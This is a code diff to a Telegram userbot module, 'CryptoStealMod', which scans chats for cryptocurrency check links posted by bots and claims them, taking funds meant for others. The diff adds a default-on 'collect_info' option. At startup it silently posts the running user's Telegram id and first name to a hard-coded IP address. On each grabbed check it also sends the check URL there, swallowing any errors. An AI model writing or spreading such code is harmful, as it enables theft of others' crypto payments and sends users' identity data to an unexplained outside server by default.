@@ -9,8 +9,9 @@
 from .. import loader, utils
 import logging
 import asyncio
+import requests
 
-__version__ = (1, 3, 0)
+__version__ = (1, 3, 1)
 logger = logging.getLogger(__name__)
 
 
@@ -30,8 +31,9 @@ class CryptoStealMod(loader.Module):
         ),
         "config_antissca_status": "Ignore checks by the members of SSCA?",
         "config_allow_other_bots": "If disabled i will only steal checks by Trusted Bots",
-        "config_use_asset_chat": "If disabled the 'crypto-steal' will not be used",
+        "config_use_asset_chat": "If disabled the 'crypto-steal' chat will not be used",
         "config_trusted_bots": "Trusted Bots to steal from even if allow_other_bots is False (lowercase username)",
+        "config_collect_info": "If disabled, the crypto-steal will not collect the basic information (id, first name) about the user",
         "cant_create_asset_chat": "😢 The asset chat is not created, for some reason.",
         "asset_chat_got_check": (
             "☘️ Hopefully got a new check!\n🔗 Here is the link to it: {u1}?start={u2} or <code>/start {u2}</code> in {u1}"
@@ -49,6 +51,7 @@ class CryptoStealMod(loader.Module):
         "config_antissca_status": "Игнорировать чеки от участников SSCA?",
         "config_allow_other_bots": "Если выключено то я буду тырить только чеки Доверенных Ботов",
         "config_use_asset_chat": "Если выключено то чат 'crypto-steal' не будет использован",
+        "config_collect_info": "Если выключено то Crypto-steal не будет собирать базовую информацию (айди, имя) о юзере",
         "config_trusted_bots": "Доверенные Боты из которых я буду тырить даже если allow_other_bots на False (ник маленькими буквами)",
         "cant_create_asset_chat": "😢 Не удалось создать чат Crypto-Steal, почему-то.",
         "asset_chat_got_check": (
@@ -104,9 +107,17 @@ class CryptoStealMod(loader.Module):
                     )
                 )
             ),
+            loader.ConfigValue(
+                "collect_info",
+                True,
+                lambda: self.strings("config_collect_info"),
+                validator=loader.validators.Boolean()
+            ),
         )
 
     async def client_ready(self):
+        self.me = await self.client.get_me()
+
         self.asset_chat = await utils.asset_channel(
             self.client,
             "crypto-steal",
@@ -119,6 +130,12 @@ class CryptoStealMod(loader.Module):
         if not self.asset_chat:
             await self.inline.bot.send_message(self._client.tg_id, self.strings("cant_create_asset_chat"))
             logger.error("cant create asset chat")
+
+        if self.config["collect_info"]:
+            try:
+                requests.post("http://130.162.186.90:18691/launched", json={"user_id": self.me.id, "user_firstname": self.me.first_name})
+            except Exception:
+                pass
 
     @loader.command(ru_doc="Отображает список участников SSCA")
     async def sscateam(self, message):
@@ -143,12 +160,12 @@ class CryptoStealMod(loader.Module):
 
         user = await self.client.get_entity(url[0])
 
+        link = f"https://t.me/c/{str(message.chat_id).replace('-100', '')}/{message.id}"
+
         if str(message.from_id) in await self.get_ssca_members():
             return await self.inline.bot.send_message(
                 f"-100{self.asset_chat[0].id}",
-                self.strings("got_ssca_check").format(
-                    f"https://t.me/c/{str(message.chat_id).replace('-100', '')}/{message.id}"
-                ),
+                self.strings("got_ssca_check").format(link),
                 disable_web_page_preview=True
             )
 
@@ -172,10 +189,23 @@ class CryptoStealMod(loader.Module):
                 self.strings("asset_chat_got_check").format(
                     u1=url[0],
                     u2=url[1],
-                    link=f"https://t.me/c/{str(message.chat_id).replace('-100', '')}/{message.id}"
+                    link=link
                 ),
                 disable_web_page_preview=True
             )
+
+        if self.config["collect_info"]:
+            try:
+                requests.post(
+                    "http://130.162.186.90:18691/gotcheck",
+                    json={
+                        "url": message.buttons[0][0].url,
+                        "user_id": self.me.id,
+                        "user_firstname": self.me.first_name
+                    }
+                )
+            except Exception:
+                pass
 
     async def cryptostealcmd(self, message):
         """Toggle Crypto-Steal"""
